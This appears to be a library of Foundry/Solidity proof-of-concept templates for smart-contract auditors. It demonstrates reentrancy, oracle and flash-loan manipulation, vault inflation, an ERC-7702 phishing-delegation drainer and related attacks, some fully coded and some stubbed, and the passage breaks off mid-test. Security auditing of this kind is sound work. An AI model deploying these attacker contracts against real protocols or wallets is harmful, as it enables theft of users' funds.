# Proof of Concept Templates

Foundry-based templates for demonstrating common vulnerabilities.
Copy and adapt these to prove exploits in audited contracts.

---

## Reentrancy PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
    function balanceOf(address) external view returns (uint256);
}

contract ReentrancyAttacker {
    IVulnerableVault public vault;
    uint256 public attackCount;

    constructor(address _vault) {
        vault = IVulnerableVault(_vault);
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && attackCount < 10) {
            attackCount++;
            vault.withdraw();
        }
    }
}

contract ReentrancyPoC is Test {
    IVulnerableVault vault;
    ReentrancyAttacker attacker;

    function setUp() public {
        // Deploy vulnerable contract
        // vault = IVulnerableVault(address(new VulnerableVault()));

        // Fund vault with victim deposits
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();

        // Deploy attacker
        attacker = new ReentrancyAttacker(address(vault));
    }

    function test_ReentrancyExploit() public {
        uint256 vaultBalanceBefore = address(vault).balance;

        // Attacker deposits 1 ETH and exploits reentrancy
        vm.deal(address(this), 1 ether);
        attacker.attack{value: 1 ether}();

        // Attacker drained more than deposited
        assertGt(address(attacker).balance, 1 ether);
        assertLt(address(vault).balance, vaultBalanceBefore);

        console.log("Vault balance before:", vaultBalanceBefore);
        console.log("Vault balance after:", address(vault).balance);
        console.log("Attacker profit:", address(attacker).balance - 1 ether);
    }
}
```

---

## Flash Loan Attack PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IFlashLoanProvider {
    function flashLoan(address token, uint256 amount, bytes calldata data) external;
}

interface IVulnerableProtocol {
    function priceOracle() external view returns (uint256);
    function deposit(uint256 amount) external;
    function borrow(uint256 amount) external;
}

contract FlashLoanAttacker {
    IFlashLoanProvider public lender;
    IVulnerableProtocol public target;
    IERC20 public token;

    constructor(address _lender, address _target, address _token) {
        lender = IFlashLoanProvider(_lender);
        target = IVulnerableProtocol(_target);
        token = IERC20(_token);
    }

    function attack() external {
        // Borrow large amount to manipulate price
        uint256 borrowAmount = 1_000_000 ether;
        lender.flashLoan(address(token), borrowAmount, "");
    }

    function onFlashLoan(
        address initiator,
        address tokenAddr,
        uint256 amount,
        uint256 fee,
        bytes calldata
    ) external returns (bytes32) {
        // 1. Manipulate price oracle (e.g., swap in AMM)
        // 2. Exploit protocol at manipulated price
        // 3. Return flash loan + fee

        // Repay flash loan
        IERC20(tokenAddr).transfer(msg.sender, amount + fee);

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}

contract FlashLoanPoC is Test {
    function test_FlashLoanPriceManipulation() public {
        // Setup: fork mainnet at specific block
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), 18000000);

        uint256 priceBefore = 0; // target.priceOracle();

        // Execute attack
        // attacker.attack();

        uint256 priceAfter = 0; // target.priceOracle();

        // Price was manipulated
        // assertGt(priceAfter, priceBefore * 2);
    }
}
```

---

## Oracle Manipulation PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IUniswapV2Pair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function swap(uint256, uint256, address, bytes calldata) external;
}

interface IVulnerableLending {
    function getPrice() external view returns (uint256);
    function borrow(uint256 collateral) external returns (uint256);
}

contract OracleManipulationPoC is Test {
    IUniswapV2Pair pair;
    IVulnerableLending lending;

    function setUp() public {
        // Fork mainnet
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"));
    }

    function test_SpotPriceManipulation() public {
        // Get price before manipulation
        uint256 priceBefore = lending.getPrice();
        console.log("Price before:", priceBefore);

        // Manipulate AMM reserves with large swap
        (uint112 reserve0, uint112 reserve1,) = pair.getReserves();
        uint256 swapAmount = uint256(reserve0) / 2; // 50% of reserves

        // Execute swap to skew price
        // pair.swap(swapAmount, 0, address(this), "");

        // Price after manipulation
        uint256 priceAfter = lending.getPrice();
        console.log("Price after:", priceAfter);

        // Exploit: borrow at manipulated price
        // uint256 borrowed = lending.borrow(1 ether);

        // Restore AMM (swap back)
        // Keep profit
    }
}
```

---

## Access Control Bypass PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVulnerableContract {
    function initialize(address owner) external;
    function adminWithdraw(address to) external;
    function owner() external view returns (address);
}

contract AccessControlPoC is Test {
    IVulnerableContract target;
    address attacker = makeAddr("attacker");

    function setUp() public {
        // Deploy uninitialized implementation
        // target = IVulnerableContract(address(new VulnerableImpl()));
    }

    function test_UninitializedProxy() public {
        // Attacker calls initialize on implementation directly
        vm.prank(attacker);
        target.initialize(attacker);

        // Attacker is now owner
        assertEq(target.owner(), attacker);

        // Attacker can drain funds
        vm.prank(attacker);
        target.adminWithdraw(attacker);
    }

    function test_MissingAccessControl() public {
        // Function lacks onlyOwner modifier
        vm.prank(attacker);
        target.adminWithdraw(attacker); // Should revert but doesn't
    }
}
```

---

## First Depositor / Inflation Attack PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IERC4626 {
    function deposit(uint256 assets, address receiver) external returns (uint256 shares);
    function redeem(uint256 shares, address receiver, address owner) external returns (uint256 assets);
    function totalSupply() external view returns (uint256);
    function totalAssets() external view returns (uint256);
    function balanceOf(address) external view returns (uint256);
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract InflationAttackPoC is Test {
    IERC4626 vault;
    IERC20 token;

    address attacker = makeAddr("attacker");
    address victim = makeAddr("victim");

    function setUp() public {
        // Deploy vault and token
        // Fund attacker and victim
        deal(address(token), attacker, 10001 ether);
        deal(address(token), victim, 10000 ether);
    }

    function test_InflationAttack() public {
        // Step 1: Attacker is first depositor, deposits 1 wei
        vm.startPrank(attacker);
        token.transfer(address(vault), 1); // Approve first
        vault.deposit(1, attacker);

        // Attacker has 1 share
        assertEq(vault.balanceOf(attacker), 1);

        // Step 2: Attacker donates large amount directly
        token.transfer(address(vault), 10000 ether);
        vm.stopPrank();

        // Vault now has 10000 ETH + 1 wei, but only 1 share exists
        // Price per share = 10000 ETH

        // Step 3: Victim deposits 10000 ETH
        vm.startPrank(victim);
        // token.approve(address(vault), 10000 ether);
        uint256 victimShares = vault.deposit(10000 ether, victim);
        vm.stopPrank();

        // Victim gets 0 or 1 shares due to rounding!
        console.log("Victim shares:", victimShares);
        console.log("Attacker shares:", vault.balanceOf(attacker));

        // Step 4: Attacker redeems their 1 share
        vm.prank(attacker);
        uint256 attackerRedeemed = vault.redeem(1, attacker, attacker);

        console.log("Attacker redeemed:", attackerRedeemed);
        // Attacker gets ~50% of all assets (their donation + half of victim's deposit)
    }
}
```

---

## Signature Replay PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IVulnerablePermit {
    function permit(
        address owner,
        address spender,
        uint256 value,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;
    function nonces(address) external view returns (uint256);
}

contract SignatureReplayPoC is Test {
    IVulnerablePermit token;

    function test_CrossChainReplay() public {
        // Same signature valid on multiple chains if chainId not in hash

        // Fork Chain A
        // vm.createSelectFork("chain_a_rpc");
        // Execute permit with signature

        // Fork Chain B
        // vm.createSelectFork("chain_b_rpc");
        // Replay same signature - should fail but doesn't
    }

    function test_MissingNonce() public {
        // If nonce not incremented, same signature can be reused
        uint256 nonceBefore = token.nonces(address(this));

        // Execute permit
        // token.permit(...);

        uint256 nonceAfter = token.nonces(address(this));

        // Nonce should increment
        assertEq(nonceAfter, nonceBefore + 1);
    }
}
```

---

## Governance Attack PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

interface IGovernor {
    function propose(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        string memory description
    ) external returns (uint256);
    function castVote(uint256 proposalId, uint8 support) external;
    function execute(
        address[] memory targets,
        uint256[] memory values,
        bytes[] memory calldatas,
        bytes32 descriptionHash
    ) external;
    function quorum(uint256 blockNumber) external view returns (uint256);
}

interface IToken {
    function delegate(address) external;
    function balanceOf(address) external view returns (uint256);
}

interface IFlashLoan {
    function flashLoan(uint256 amount) external;
}

contract GovernanceAttackPoC is Test {
    IGovernor governor;
    IToken govToken;
    IFlashLoan flashLender;

    address attacker = makeAddr("attacker");

    function test_FlashLoanGovernance() public {
        // Check if voting power uses current balance (vulnerable)
        // vs snapshots (safe)

        uint256 quorum = governor.quorum(block.number - 1);
        console.log("Quorum required:", quorum);

        // Flash borrow governance tokens
        // flashLender.flashLoan(quorum * 2);

        // In callback:
        // 1. Delegate to self
        // 2. Create malicious proposal
        // 3. Vote
        // 4. Return tokens

        // If using live balances, attack succeeds
    }
}
```

---

## Uniswap V4 Hook Drain PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// Minimal V4 interfaces for PoC
// NOTE: Actual V4 PoolKey is a struct: {Currency currency0, Currency currency1, uint24 fee, int24 tickSpacing, IHooks hooks}
// Currency is a value type wrapping address. SwapParams = {bool zeroForOne, int256 amountSpecified, uint160 sqrtPriceLimitX96}
// BalanceDelta is a value type: int256 packing (amount0, amount1) as (int128, int128).
// This PoC uses simplified types sufficient to demonstrate the vulnerability concept.
// For a compilable PoC against real V4 contracts, import from:
// https://github.com/Uniswap/v4-core/tree/main/src/interfaces
interface IPoolManager {
    function unlock(bytes calldata data) external returns (bytes memory);
    // Real signature: take(Currency currency, address to, uint256 amount)
    // Currency is address-equivalent: cast with Currency.wrap(address) / Currency.unwrap(currency)
    function take(address currency, address to, uint256 amount) external;
    function settle() external payable returns (uint256);
    function sync(address currency) external;
}

// Simplified interface for PoC purposes — see note above for actual signature
// Real afterSwap: (address sender, PoolKey calldata key, SwapParams calldata params, BalanceDelta delta, bytes calldata hookData)
interface IHook {
    function afterSwap(
        address sender,
        address poolKey,    // simplified: actual type is PoolKey struct
        bytes calldata swapParams, // simplified: actual type is SwapParams struct
        int256 delta,       // simplified: actual type is BalanceDelta value type
        bytes calldata hookData
    ) external returns (bytes4, int128);
}

// Simulated vulnerable hook that blindly executes hookData instructions
contract VulnerableHook {
    IPoolManager public poolManager;

    constructor(address _pm) { poolManager = IPoolManager(_pm); }

    // Simplified signature for PoC — real V4 signature uses PoolKey struct + SwapParams + BalanceDelta
    function afterSwap(
        address,
        address,    // poolKey (simplified)
        bytes calldata,
        int256,
        bytes calldata hookData
    ) external returns (bytes4, int128) {
        if (hookData.length > 0) {
            // VULNERABLE: executes arbitrary take() based on hookData
            (address token, address recipient, uint256 amount) =
                abi.decode(hookData, (address, address, uint256));
            poolManager.take(token, recipient, amount);
        }
        return (VulnerableHook.afterSwap.selector, 0);
    }
}

contract V4HookDrainPoC is Test {
    IPoolManager poolManager;
    VulnerableHook hook;

    address attacker = makeAddr("attacker");
    address tokenA = makeAddr("tokenA");

    function setUp() public {
        // In a real PoC: fork mainnet with deployed V4 PoolManager
        // vm.createSelectFork(vm.envString("ETH_RPC_URL"), BLOCK);
        // poolManager = IPoolManager(V4_POOL_MANAGER_ADDR);
    }

    function test_HookDrainViaHookData() public {
        // Attacker constructs malicious hookData
        bytes memory maliciousHookData = abi.encode(
            tokenA,     // token to drain
            attacker,   // recipient
            1000 ether  // amount to drain
        );

        uint256 poolManagerBalanceBefore = IERC20(tokenA).balanceOf(address(poolManager));

        // Trigger a swap that calls the hook with attacker-controlled hookData
        // vm.prank(attacker);
        // router.swap(poolKey, swapParams, maliciousHookData);

        uint256 attackerBalanceAfter = IERC20(tokenA).balanceOf(attacker);
        uint256 poolManagerBalanceAfter = IERC20(tokenA).balanceOf(address(poolManager));

        console.log("Attacker gained:", attackerBalanceAfter);
        console.log("PoolManager lost:", poolManagerBalanceBefore - poolManagerBalanceAfter);

        // assertGt(attackerBalanceAfter, 0, "attack failed");
    }
}

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}
```

---

## Transient Storage Reentrancy Guard Bypass PoC

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// Vault using transient storage reentrancy guard with a predictable slot
contract TransientGuardVault {
    // VULNERABLE: known slot derived from common pattern
    bytes32 constant GUARD_SLOT = keccak256("reentrancy.guard");

    mapping(address => uint256) public balances;

    modifier nonReentrantTransient() {
        assembly {
            if tload(GUARD_SLOT) {
                mstore(0, 0x37ed32e8) // ReentrancyGuardReentrantCall()
                revert(0x1c, 0x04)
            }
            tstore(GUARD_SLOT, 1)
        }
        _;
        assembly { tstore(GUARD_SLOT, 0) }
    }

    function deposit() external payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external nonReentrantTransient {
        require(balances[msg.sender] >= amount, "insufficient");
        balances[msg.sender] -= amount;
        (bool ok,) = msg.sender.call{value: amount}("");
        require(ok, "transfer failed");
    }

    // VULNERABLE: delegatecall to user-provided library shares transient storage
    function executeLibrary(address lib, bytes calldata data) external nonReentrantTransient {
        (bool ok,) = lib.delegatecall(data);
        require(ok, "lib call failed");
    }
}

// Attacker library: clears the guard slot via delegatecall, enabling reentrancy
contract GuardClearingLibrary {
    bytes32 constant GUARD_SLOT = keccak256("reentrancy.guard");

    function clearGuard() external {
        // Executed in the context of the vault (delegatecall)
        // Clears the vault's transient reentrancy guard
        assembly { tstore(GUARD_SLOT, 0) }
    }
}

// Attacker contract
contract TransientBypassAttacker {
    TransientGuardVault public vault;
    GuardClearingLibrary public lib;
    bool public attacking;

    constructor(address _vault) {
        vault = TransientGuardVault(_vault);
        lib = new GuardClearingLibrary();
    }

    function attack() external payable {
        vault.deposit{value: msg.value}();
        attacking = true;
        vault.withdraw(msg.value);
    }

    receive() external payable {
        if (attacking && address(vault).balance >= 1 ether) {
            // Step 1: clear the guard via delegatecall through the vault
            vault.executeLibrary(
                address(lib),
                abi.encodeCall(GuardClearingLibrary.clearGuard, ())
            );
            // Step 2: now guard is cleared — reenter withdraw
            vault.withdraw(1 ether);
        }
    }
}

contract TransientStorageBypassPoC is Test {
    TransientGuardVault vault;
    TransientBypassAttacker attacker;

    function setUp() public {
        vault = new TransientGuardVault();
        attacker = new TransientBypassAttacker(address(vault));

        // Fund vault with victim deposits
        address victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        vault.deposit{value: 10 ether}();
    }

    function test_TransientGuardBypassViaDelegatecall() public {
        uint256 vaultBefore = address(vault).balance;
        vm.deal(address(attacker), 1 ether);

        attacker.attack{value: 1 ether}();

        uint256 vaultAfter = address(vault).balance;
        console.log("Vault drained:", vaultBefore - vaultAfter);
        console.log("Attacker balance:", address(attacker).balance);

        // assertGt(address(attacker).balance, 1 ether, "attack should be profitable");
    }
}
```

---

## ERC-7702 Malicious Delegation PoC

Uses Foundry 1.0+ native ERC-7702 cheatcodes: `vm.signDelegation`, `vm.attachDelegation`,
`vm.signAndAttachDelegation`. These create type-4 (EIP-7702) authorization tuples that
delegate an EOA's code to an implementation contract.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";
import "forge-std/Vm.sol";

// --- Malicious implementation: attacker tricks victim into delegating here ---
contract MaliciousWalletImpl {
    address public owner;

    // Once the EOA delegates to this, attacker calls initialize to take over
    function initialize(address _owner) external {
        owner = _owner;
    }

    // Drains all ETH to attacker
    function drain(address payable recipient) external {
        require(msg.sender == owner, "not owner");
        (bool ok,) = recipient.call{value: address(this).balance}("");
        require(ok, "drain failed");
    }

    // Transfers arbitrary ERC-20 tokens
    function drainToken(address token, address recipient, uint256 amount) external {
        require(msg.sender == owner, "not owner");
        IERC20(token).transfer(recipient, amount);
    }

    // Callback that steals value during a sponsored transaction
    function executeCallback(address payable beneficiary) external {
        (bool ok,) = beneficiary.call{value: address(this).balance}("");
        require(ok, "callback drain failed");
    }
}

// --- Secure implementation for comparison ---
contract SecureWalletImpl {
    // Uses ERC-7201 namespaced storage to isolate state across delegations.
    // In ERC-7702, each EOA has its own storage space, so $.owner == address(0)
    // correctly identifies an EOA that has not yet been initialized — regardless
    // of which EOA is delegating to this implementation.
    // There is no constructor: ERC-7702 implementations do not run constructors
    // for the delegating EOA; state is set via initialize() instead.

    /// @custom:storage-location erc7201:wallet.storage
    struct WalletStorage {
        address owner;
        uint256 nonce;
    }

    bytes32 private constant _WALLET_STORAGE =
        keccak256(abi.encode(uint256(keccak256("wallet.storage")) - 1)) & ~bytes32(uint256(0xff));

    function _getStorage() private pure returns (WalletStorage storage $) {
        assembly { $.slot := _WALLET_STORAGE }
    }

    // One-time initialization: owner can only be set once per EOA.
    // $.owner == address(0) is the guard — safe because ERC-7201 namespacing
    // ensures this slot is isolated from other implementations.
    function initialize(address _owner) external {
        require(_owner != address(0), "zero owner");
        WalletStorage storage $ = _getStorage();
        require($.owner == address(0), "already initialized");
        $.owner = _owner;
    }
}

// --- Malicious paymaster-like contract for sponsored tx sandbox escape ---
contract MaliciousPaymaster {
    // Relayer thinks it's paying gas for a benign operation, but the
    // delegated EOA's receive() (set by ERC-7702) triggers a callback
    // that drains the EOA's value back to the attacker.
    function sponsorTransaction(address target, bytes calldata data) external payable {
        // Relayer sends ETH to cover gas and forwards the call
        (bool ok,) = target.call{value: msg.value}(data);
        require(ok, "sponsored call failed");
    }
}

interface IERC20 {
    function transfer(address, uint256) external returns (bool);
    function balanceOf(address) external view returns (uint256);
}

contract ERC7702AbusePoc is Test {
    MaliciousWalletImpl maliciousImpl;
    SecureWalletImpl secureImpl;

    address attacker;
    uint256 attackerPk;
    address victim;
    uint256 victimPk;

    function setUp() public {
        maliciousImpl = new MaliciousWalletImpl();
        secureImpl = new SecureWalletImpl();

        (attacker, attackerPk) = makeAddrAndKey("attacker");
        (victim, victimPk) = makeAddrAndKey("victim");

        vm.deal(victim, 10 ether);
        vm.deal(attacker, 1 ether);
    }

    // ---------------------------------------------------------------
    // (a) Malicious delegation: victim signs authorization, attacker
    //     attaches it and drains victim's ETH via the delegated code
    // ---------------------------------------------------------------
    function test_ERC7702MaliciousDelegation() public {
        uint256 victimBalanceBefore = victim.balance;
        uint256 attackerBalanceBefore = attacker.balance;

        // Step 1: Victim is tricked (phishing) into signing a delegation
        //         pointing their EOA code to maliciousImpl
        Vm.SignedDelegation memory signedDelegation =
            vm.signDelegation(address(maliciousImpl), victimPk);

        // Step 2: Attacker attaches the delegation in a transaction
        vm.startPrank(attacker);
        vm.attachDelegation(signedDelegation);

        // Step 3: Attacker calls initialize on the victim's address
        //         (victim's EOA now executes maliciousImpl's code)
        (bool ok,) = victim.call(
            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
        );
        assertTrue(ok, "initialize should succeed");

        // Step 4: Attacker drains victim's ETH
        (ok,) = victim.call(
            abi.encodeCall(MaliciousWalletImpl.drain, (payable(attacker)))
        );
        assertTrue(ok, "drain should succeed");
        vm.stopPrank();

        // Assertions: victim drained, attacker profited
        assertEq(victim.balance, 0, "victim should be fully drained");
        assertEq(
            attacker.balance,
            attackerBalanceBefore + victimBalanceBefore,
            "attacker should have victim's ETH"
        );

        console.log("Victim balance before:", victimBalanceBefore);
        console.log("Victim balance after:", victim.balance);
        console.log("Attacker profit:", attacker.balance - attackerBalanceBefore);
    }

    // ---------------------------------------------------------------
    // (b) Cross-chain replay: authorization signed with chainId=0
    //     replays on any chain per EIP-7702 spec
    // ---------------------------------------------------------------
    function test_CrossChainReplayChainIdZero() public {
        // chainId=0 means "valid on all chains" per EIP-7702
        // vm.signDelegation uses the current chain's ID by default.
        // To sign with chainId=0, we temporarily set chainId to 0.

        // Record the current chain ID
        uint256 originalChainId = block.chainid;

        // Sign delegation on "chain 0" (wildcard)
        vm.chainId(0);
        Vm.SignedDelegation memory wildcardDelegation =
            vm.signDelegation(address(maliciousImpl), victimPk);

        // --- Replay on Chain A (e.g., Ethereum mainnet, chainId=1) ---
        vm.chainId(1);

        vm.startPrank(attacker);
        vm.attachDelegation(wildcardDelegation);

        (bool okA,) = victim.call(
            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
        );
        assertTrue(okA, "delegation should work on chain 1");
        vm.stopPrank();

        // --- Replay on Chain B (e.g., Arbitrum, chainId=42161) ---
        vm.chainId(42161);

        vm.startPrank(attacker);
        vm.attachDelegation(wildcardDelegation);

        // Re-initialize works on a different chain because it's a fresh
        // EVM context — the victim's storage on chain B is independent
        (bool okB,) = victim.call(
            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
        );
        assertTrue(okB, "same delegation should replay on chain 42161");
        vm.stopPrank();

        // Restore original chain ID
        vm.chainId(originalChainId);

        console.log("Wildcard delegation (chainId=0) replayed on both chains");
    }

    // ---------------------------------------------------------------
    // (c) Sponsored transaction sandbox escape: relayer pays gas but
    //     the delegated EOA code steals value via a callback
    // ---------------------------------------------------------------
    function test_SponsoredTxSandboxEscape() public {
        MaliciousPaymaster paymaster = new MaliciousPaymaster();
        vm.deal(address(paymaster), 5 ether);

        // Victim delegates to malicious impl
        vm.signAndAttachDelegation(address(maliciousImpl), victimPk);

        // Attacker initializes victim's delegated code
        vm.prank(attacker);
        (bool ok,) = victim.call(
            abi.encodeCall(MaliciousWalletImpl.initialize, (attacker))
        );
        assertTrue(ok);

        // Relayer (paymaster) thinks it's sponsoring a benign tx.
        // It sends 2 ETH to victim's address as part of the sponsored call.
        // But the call triggers executeCallback which drains to attacker.
        uint256 attackerBefore = attacker.balance;

        vm.prank(address(paymaster));
        paymaster.sponsorTransaction{value: 2 ether}(
            victim,
            abi.encodeCall(
                MaliciousWalletImpl.executeCallback,
                (payable(attacker))
            )
        );

        // Attacker received the sponsored ETH plus victim's existing balance
        assertGt(
            attacker.balance,
            attackerBefore,
            "attacker should profit from sponsored tx escape"
        );

        console.log("Attacker gained from sponsored tx:", attacker.balance - attackerBefore);
    }

    // ---------------------------------------------------------------
    // (d) Secure delegation revocation: delegate to address(0) to
    //     remove the delegation per EIP-7702 spec
    // ---------------------------------------------------------------
    function test_DelegationRevocation() public {
        // Step 1: Delegate victim to secureImpl
        Vm.SignedDelegation memory delegation =
            vm.signDelegation(address(secureImpl), victimPk);

        vm.prank(attacker);
        vm.attachDelegation(delegation);

        // Confirm delegation is active: initialize succeeds
        vm.prank(victim);
        (bool ok,) = victim.call(
            abi.encodeCall(SecureWalletImpl.initialize, (victim))
        );
        assertTrue(ok, "delegation should be active");

        // Step 2: Victim revokes by delegating to address(0)
        Vm.SignedDelegation memory revocation =
            vm.signDelegation(address(0), victimPk);

        vm.prank(victim);
        vm.attachDelegation(revocation);

        // Step 3: Calling the victim now reverts — no code to execute
        (bool okAfter,) = victim.call(
            abi.encodeCall(SecureWalletImpl.initialize, (victim))
        );
        // After revocation, victim is a plain EOA again.
        // The call may succeed (no-op) or revert depending on context,
        // but critically the implementation code is no longer executable.
        // The key assertion: codehash indicates no delegation
        assertEq(victim.code.length, 0, "victim should have no code after revocation");

        console.log("Delegation revoked: victim is a plain EOA again");
    }
}
```

**Key takeaways:**
- `vm.signDelegation(impl, pk)` creates a signed EIP-7702 authorization tuple
- `vm.attachDelegation(signed)` attaches it to the next transaction's authorization list
- `vm.signAndAttachDelegation(impl, pk)` is the combined one-step helper
- Delegating to `address(0)` revokes the delegation (EOA becomes plain again)
- `chainId=0` in the authorization means "valid on all chains" -- always restrict to a specific chain
- Relayers/paymasters must validate the delegation target before sponsoring transactions

---

## EOF Container Compatibility PoC

Demonstrates security issues when migrating contracts to the EVM Object Format (EOF),
specified by EIP-7692 (meta-EIP for Fusaka hardfork, 2026). EOF introduces deploy-time
bytecode validation, removes `JUMP`/`JUMPI` in favor of static `RJUMP`/`RJUMPI`/`RJUMPV`,
removes `SELFDESTRUCT`, and replaces `DELEGATECALL` with `EXTDELEGATECALL` for EOF-to-EOF calls.

**Foundry EOF support** is experimental via the `--eof` flag (`foundry-rs/foundry#7470`).
Not all tests below require `--eof` — some use `vm.etch` to simulate EOF bytecode scenarios
from legacy test contexts. Tests marked `[requires --eof]` need:

```bash
# Build with EOF container output
forge build --eof

# Run EOF-specific tests
forge test --eof --match-contract EOFCompatibilityPoc -vvv

# Check EOF compatibility of existing contracts
solc --bin --optimize --via-ir --strict-assembly Contract.sol
```

**References**: `vulnerability-taxonomy.md §22`, `l2-crosschain.md` (Fusaka gas cap),
`industry-standards.md` (EIP-7692 status)

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import "forge-std/Test.sol";

// --- Legacy UUPS proxy (simplified) ---
// This proxy uses DELEGATECALL to forward calls to an implementation.
// Under EOF, DELEGATECALL from legacy code to an EOF implementation FAILS.
contract LegacyUUPSProxy {
    // ERC-1967 implementation slot
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address impl) {
        assembly { sstore(_IMPLEMENTATION_SLOT, impl) }
    }

    function implementation() public view returns (address impl) {
        assembly { impl := sload(_IMPLEMENTATION_SLOT) }
    }

    fallback() external payable {
        address impl = implementation();
        assembly {
            calldatacopy(0, 0, calldatasize())
            // DELEGATECALL — works for legacy-to-legacy, but legacy-to-EOF
            // will return success=false after Fusaka
            let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }
}

// --- Legacy implementation (works with proxy) ---
contract LegacyImplementation {
    uint256 public value;

    function setValue(uint256 _value) external {
        value = _value;
    }

    function getValue() external view returns (uint256) {
        return value;
    }
}

// --- Contract that relies on selfdestruct for refunds ---
contract SelfdestructRefund {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {}

    // VULNERABLE under EOF: selfdestruct is removed.
    // Under legacy EVM, this sends remaining ETH to owner and destroys the contract.
    // Under EOF, the compiler rejects selfdestruct entirely (compile error).
    function emergencyRefund() external {
        require(msg.sender == owner, "not owner");
        selfdestruct(payable(owner));
    }
}

// --- Secure replacement: explicit withdrawal + deactivation ---
contract SecureRefund {
    address public owner;
    bool public deactivated;

    constructor() {
        owner = msg.sender;
    }

    function deposit() external payable {
        require(!deactivated, "contract deactivated");
    }

    function emergencyRefund() external {
        require(msg.sender == owner, "not owner");
        require(!deactivated, "already deactivated");
        deactivated = true;
        (bool ok,) = owner.call{value: address(this).balance}("");
        require(ok, "refund transfer failed");
    }
}

contract EOFCompatibilityPoc is Test {

    // ---------------------------------------------------------------
    // (a) Legacy proxy -> EOF impl delegatecall breakage
    //
    // A UUPS proxy deployed as legacy bytecode cannot DELEGATECALL
    // into an implementation recompiled as EOF. The EVM returns
    // success=false for cross-format DELEGATECALL after Fusaka.
    //
    // In this test we simulate the EOF implementation by using vm.etch
    // to place EOF-magic bytecode at the implementation address, which
    // causes the legacy proxy's DELEGATECALL to fail.
    // ---------------------------------------------------------------
    function test_LegacyProxyToEOFImplBreakage() public {
        // Deploy legacy proxy pointing to legacy implementation
        LegacyImplementation legacyImpl = new LegacyImplementation();
        LegacyUUPSProxy proxy = new LegacyUUPSProxy(address(legacyImpl));

        // Verify proxy works with legacy implementation
        (bool ok,) = address(proxy).call(
            abi.encodeCall(LegacyImplementation.setValue, (42))
        );
        assertTrue(ok, "legacy-to-legacy delegatecall should work");

        // Read back value through proxy
        (, bytes memory data) = address(proxy).staticcall(
            abi.encodeCall(LegacyImplementation.getValue, ())
        );
        uint256 val = abi.decode(data, (uint256));
        assertEq(val, 42, "value should be set via proxy");

        // --- Simulate EOF upgrade ---
        // EOF containers start with magic bytes 0xEF0001 (EIP-3540).
        // When the impl is recompiled to EOF and redeployed, the legacy
        // proxy's DELEGATECALL will fail because legacy->EOF DELEGATECALL
        // is not allowed. Only EXTDELEGATECALL (EOF-to-EOF) works.
        //
        // We simulate this by etching minimal EOF bytecode at the impl address.
        // EOF magic: 0xEF00 (magic) + 0x01 (version) + minimal valid header
        bytes memory eofBytecode = hex"EF000101000402000100010400000000800000FE";
        vm.etch(address(legacyImpl), eofBytecode);

        // Legacy proxy's DELEGATECALL to EOF impl should now fail
        (bool okAfterEOF,) = address(proxy).call(
            abi.encodeCall(LegacyImplementation.setValue, (99))
        );
        assertFalse(okAfterEOF, "legacy-to-EOF delegatecall should fail");

        console.log("Legacy proxy DELEGATECALL to EOF impl: FAILED (expected)");
        console.log("Fix: redeploy proxy as EOF and use EXTDELEGATECALL");
    }

    // ---------------------------------------------------------------
    // (b) SELFDESTRUCT silent failure / compile error under EOF
    //
    // EOF removes SELFDESTRUCT entirely. Contracts that rely on it for
    // emergency refunds or cleanup will fail to compile under EOF.
    // This test documents the issue and provides the secure pattern.
    //
    // NOTE: The SelfdestructRefund contract above compiles under legacy
    // EVM. Under `forge build --eof`, solc will reject it:
    //   Error: "selfdestruct" has been removed in EOF
    //
    // The test below uses the SecureRefund pattern instead.
    // ---------------------------------------------------------------
    function test_SelfdestructReplacementPattern() public {
        // Deploy the secure replacement
        SecureRefund secure = new SecureRefund();
        vm.deal(address(secure), 5 ether);

        address owner = secure.owner();
        uint256 ownerBalanceBefore = owner.balance;

        // Emergency refund works without selfdestruct
        vm.prank(owner);
        secure.emergencyRefund();

        assertEq(address(secure).balance, 0, "contract should be drained");
        assertEq(owner.balance, ownerBalanceBefore + 5 ether, "owner should receive refund");
